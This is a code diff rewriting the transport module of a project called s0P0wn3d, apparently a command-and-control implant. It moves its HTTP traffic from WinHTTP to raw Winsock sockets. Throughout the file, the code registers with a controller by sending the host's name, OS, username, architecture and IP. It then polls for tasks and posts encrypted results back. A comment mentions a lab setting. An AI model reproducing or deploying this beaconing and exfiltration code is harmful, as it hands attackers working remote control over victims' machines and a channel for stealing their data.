@@ -1,176 +1,228 @@
-/*
- * s0P0wn3d — Implémentation du transport (WinHTTP).
- *
- * Utilise l'API WinHTTP native de Windows pour les communications HTTP.
- */
-
 #include "transport.h"
-#include "../shared/json.h"
-#include <windows.h>
-#include <winhttp.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include "../shared/base64.h"
 
-static HINTERNET hSession = NULL;
-static HINTERNET hConnect = NULL;
-static char controller_host[256] = {0};
-static int controller_port = 0;
+#pragma comment(lib, "ws2_32.lib")
+
+static char server_host[256] = {0};
+static int server_port = 0;
 
 int transport_init(const char *host, int port) {
-    strncpy(controller_host, host, sizeof(controller_host) - 1);
-    controller_port = port;
+    if (!host) return -1;
 
-    hSession = WinHttpOpen(L"s0P0wn3d/0.1",
-                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                           WINHTTP_NO_PROXY_NAME,
-                           WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) {
-        fprintf(stderr, "[-] WinHttpOpen échoué: %lu\n", GetLastError());
+    strncpy(server_host, host, sizeof(server_host) - 1);
+    server_port = port;
+    
+    WSADATA wsa;
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
         return -1;
     }
-
-    /* Convertir le host en wide string */
-    wchar_t whost[256] = {0};
-    MultiByteToWideChar(CP_UTF8, 0, controller_host, -1, whost, 255);
-
-    hConnect = WinHttpConnect(hSession, whost,
-                              (INTERNET_PORT)controller_port, 0);
-    if (!hConnect) {
-        fprintf(stderr, "[-] WinHttpConnect échoué: %lu\n", GetLastError());
-        WinHttpCloseHandle(hSession);
-        return -1;
-    }
-
+    
     return 0;
 }
 
-/* Helper : effectue une requête HTTP et récupère la réponse. */
-static char *http_request(const wchar_t *method, const wchar_t *path,
-                          const char *body, size_t body_len) {
-    HINTERNET hRequest = WinHttpOpenRequest(
-        hConnect, method, path,
-        NULL, WINHTTP_NO_REFERER,
-        WINHTTP_DEFAULT_ACCEPT_TYPES,
-        0  /* HTTP (pas HTTPS pour le lab) */
-    );
-    if (!hRequest) return NULL;
+void transport_cleanup(void) {
+    WSACleanup();
+}
 
-    BOOL result;
-    if (body && body_len > 0) {
-        wchar_t headers[256];
-        swprintf(headers, 256,
-            L"Content-Type: application/json\r\n"
-            L"Content-Length: %zu\r\n",
-            body_len);
-        result = WinHttpSendRequest(hRequest, headers, (DWORD)-1,
-                                    (LPVOID)body, (DWORD)body_len,
-                                    (DWORD)body_len, 0);
-    } else {
-        result = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                                    WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
-    }
+/* Helper: HTTP request using raw TCP sockets */
+static char *http_request(const char *method, const char *path, const char *body) {
+    struct addrinfo *result = NULL, *ptr = NULL, hints = {0};
+    SOCKET hSocket = INVALID_SOCKET;
+    char port_str[16];
+    char *response = NULL;
 
-    if (!result) {
-        WinHttpCloseHandle(hRequest);
+    printf("[DEBUG] HTTP %s %s (host=%s:%d)\n", method, path, server_host, server_port);
+
+    snprintf(port_str, sizeof(port_str), "%d", server_port);
+
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    /* Resolve server address */
+    printf("[DEBUG] Resolving %s:%s...\n", server_host, port_str);
+    if (getaddrinfo(server_host, port_str, &hints, &result) != 0) {
+        printf("[DEBUG] getaddrinfo failed\n");
         return NULL;
     }
-
-    result = WinHttpReceiveResponse(hRequest, NULL);
-    if (!result) {
-        WinHttpCloseHandle(hRequest);
-        return NULL;
-    }
-
-    /* Lire la réponse */
-    DWORD available = 0;
-    DWORD total_read = 0;
-    char *response = malloc(1);
-    response[0] = '\0';
-
-    do {
-        available = 0;
-        if (!WinHttpQueryDataAvailable(hRequest, &available)) break;
-        if (available == 0) break;
-
-        char *chunk = malloc(available + 1);
-        if (!chunk) break;
-
-        DWORD bytes_read = 0;
-        if (WinHttpReadData(hRequest, chunk, available, &bytes_read)) {
-            chunk[bytes_read] = '\0';
-            char *new_response = realloc(response, total_read + bytes_read + 1);
-            if (new_response) {
-                response = new_response;
-                memcpy(response + total_read, chunk, bytes_read);
-                total_read += bytes_read;
-                response[total_read] = '\0';
-            }
+    printf("[DEBUG] Resolved successfully\n");
+    
+    /* Connect to server */
+    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
+        hSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
+        if (hSocket == INVALID_SOCKET) {
+            printf("[DEBUG] Socket creation failed\n");
+            continue;
         }
-        free(chunk);
-    } while (available > 0);
+        printf("[DEBUG] Socket created\n");
 
-    WinHttpCloseHandle(hRequest);
+        if (connect(hSocket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
+            printf("[DEBUG] Connect failed: %d\n", WSAGetLastError());
+            closesocket(hSocket);
+            hSocket = INVALID_SOCKET;
+            continue;
+        }
+        printf("[DEBUG] Connected successfully\n");
+        break;
+    }
+    
+    freeaddrinfo(result);
+    
+    if (hSocket == INVALID_SOCKET) {
+        return NULL;
+    }
+    
+    /* Build HTTP request */
+    char request[S0P_MAX_PAYLOAD];
+    int body_len = body ? strlen(body) : 0;
 
-    if (total_read == 0) {
-        free(response);
+    /* Extract hostname without port for Host header */
+    char host_only[256];
+    strncpy(host_only, server_host, sizeof(host_only) - 1);
+    char *colon = strchr(host_only, ':');
+    if (colon) {
+        *colon = '\0';  /* Remove :port from Host header */
+    }
+
+    int req_len = snprintf(request, sizeof(request),
+        "%s %s HTTP/1.1\r\n"
+        "Host: %s\r\n"
+        "Content-Type: application/json\r\n"
+        "Content-Length: %d\r\n"
+        "Connection: close\r\n"
+        "\r\n%s",
+        method, path, host_only, body_len, body ? body : "");
+    
+    /* Send request */
+    printf("[DEBUG] Sending %d bytes...\n", req_len);
+    int sent = send(hSocket, request, req_len, 0);
+    if (sent == SOCKET_ERROR) {
+        printf("[DEBUG] Send failed: %d\n", WSAGetLastError());
+        closesocket(hSocket);
+        return NULL;
+    }
+    printf("[DEBUG] Sent %d bytes\n", sent);
+
+    /* Receive response */
+    response = malloc(S0P_MAX_PAYLOAD);
+    if (!response) {
+        closesocket(hSocket);
         return NULL;
     }
 
+    int total = 0;
+    int bytes;
+    char buffer[4096];
+
+    printf("[DEBUG] Receiving response...\n");
+    while ((bytes = recv(hSocket, buffer, sizeof(buffer) - 1, 0)) > 0) {
+        printf("[DEBUG] Received %d bytes\n", bytes);
+        if (total + bytes < S0P_MAX_PAYLOAD) {
+            memcpy(response + total, buffer, bytes);
+            total += bytes;
+        }
+    }
+    printf("[DEBUG] Total received: %d bytes\n", total);
+    response[total] = '\0';
+    
+    closesocket(hSocket);
+    
+    /* Extract body from HTTP response (skip headers) */
+    char *body_start = strstr(response, "\r\n\r\n");
+    if (body_start) {
+        body_start += 4;
+        printf("[DEBUG] Response body (first 200 chars): %.200s\n", body_start);
+        char *result = malloc(strlen(body_start) + 1);
+        if (result) {
+            strcpy(result, body_start);
+        }
+        free(response);
+        return result;
+    }
+
+    printf("[DEBUG] No body found, full response: %.200s\n", response);
     return response;
 }
 
+/* GET /pubkey */
 char *transport_get_pubkey(void) {
-    return http_request(L"GET", L"/pubkey", NULL, 0);
+    return http_request("GET", "/pubkey", NULL);
 }
 
-char *transport_register(const char *encrypted_key_b64,
-                          const host_info_t *host) {
-    char *body = json_build_register(encrypted_key_b64, host);
-    if (!body) return NULL;
+/* POST /register */
+char *transport_register(const char *encrypted_key, const host_info_t *host) {
+    if (!encrypted_key || !host) return NULL;
 
-    char *response = http_request(L"POST", L"/register", body, strlen(body));
-    free(body);
+    char body[S0P_MAX_PAYLOAD];
+    snprintf(body, sizeof(body),
+        "{"
+        "\"encrypted_key\":\"%s\","
+        "\"host_info\":{"
+        "\"hostname\":\"%s\","
+        "\"os\":\"%s\","
+        "\"username\":\"%s\","
+        "\"arch\":\"%s\","
+        "\"ip\":\"%s\""
+        "}"
+        "}",
+        encrypted_key,
+        host->hostname, host->os, host->username,
+        host->arch, host->ip);
 
-    if (!response) return NULL;
-
-    /* Extraire session_id de la réponse JSON */
-    char *session_id = json_extract_string(response, "session_id");
-    free(response);
-    return session_id;
+    return http_request("POST", "/register", body);
 }
 
+/* GET /tasks/{session_id} */
 char *transport_fetch_tasks(const char *session_id) {
-    wchar_t path[512];
-    swprintf(path, 512, L"/tasks/%hs", session_id);
-    return http_request(L"GET", path, NULL, 0);
+    if (!session_id) return NULL;
+
+    char path[512];
+    snprintf(path, sizeof(path), "/tasks/%s", session_id);
+    return http_request("GET", path, NULL);
 }
 
-int transport_submit_result(const char *session_id,
-                             const char *nonce_b64,
-                             const char *payload_b64,
-                             const char *tag_b64) {
-    /* Construire le body JSON */
-    char *body = malloc(S0P_MAX_PAYLOAD);
-    if (!body) return -1;
-    snprintf(body, S0P_MAX_PAYLOAD,
-        "{\"session_id\":\"%s\",\"nonce\":\"%s\",\"payload\":\"%s\",\"tag\":\"%s\"}",
-        session_id, nonce_b64, payload_b64, tag_b64);
+/* POST /results/{session_id} */
+int transport_submit_result(const char *session_id, const char *nonce,
+                            const char *payload, const char *tag) {
+    if (!session_id || !nonce || !payload || !tag) return -1;
 
-    wchar_t path[512];
-    swprintf(path, 512, L"/results/%hs", session_id);
+    char path[512];
+    snprintf(path, sizeof(path), "/results/%s", session_id);
 
-    char *response = http_request(L"POST", path, body, strlen(body));
-    free(body);
+    /* Encode payload as base64 to avoid JSON escaping issues */
+    char *payload_b64 = base64_encode((uint8_t *)payload, strlen(payload));
+    if (!payload_b64) {
+        printf("[-] Base64 encoding failed\n");
+        return -1;
+    }
+
+    char body[S0P_MAX_PAYLOAD];
+    snprintf(body, sizeof(body),
+        "{"
+        "\"nonce\":\"%s\","
+        "\"payload\":\"%s\","
+        "\"tag\":\"%s\""
+        "}",
+        nonce, payload_b64, tag);
+
+    printf("[*] Sending result: %s\n", path);
+    printf("[DEBUG] Body: %.200s\n", body);
+
+    char *response = http_request("POST", path, body);
+    int ret = (response != NULL) ? 0 : -1;
 
     if (response) {
-        free(response);
-        return 0;
+        printf("[+] Result submission ACK: %.100s\n", response);
+    } else {
+        printf("[-] Result submission FAILED\n");
     }
-    return -1;
-}
 
-void transport_cleanup(void) {
-    if (hConnect) WinHttpCloseHandle(hConnect);
-    if (hSession) WinHttpCloseHandle(hSession);
+    free(response);
+    free(payload_b64);
+    return ret;
 }
